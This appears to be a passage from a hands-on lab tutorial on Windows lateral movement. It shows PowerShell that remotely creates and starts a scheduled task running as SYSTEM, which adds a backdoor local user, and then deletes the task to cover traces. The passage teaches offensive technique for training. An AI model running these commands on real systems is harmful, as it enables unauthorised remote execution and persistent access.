- Ports:
- 135/TCP, 49152-65535/TCP (DCERPC)
- 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
- Required Group Memberships: Administrators

We can create and execute scheduled tasks by using some cmdlets available in Windows default installations:

```
# Payload must be split in Command and Args
$Command = "cmd.exe"
$Args = "/c net user munra22 aSdf1234 /add"

$Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "THMtask2"
Start-ScheduledTask -CimSession $Session -TaskName "THMtask2"
```

To delete the scheduled task after it has been used, we can use the following command:

```
Unregister-ScheduledTask -CimSession $Session -TaskName "THMtask2"
```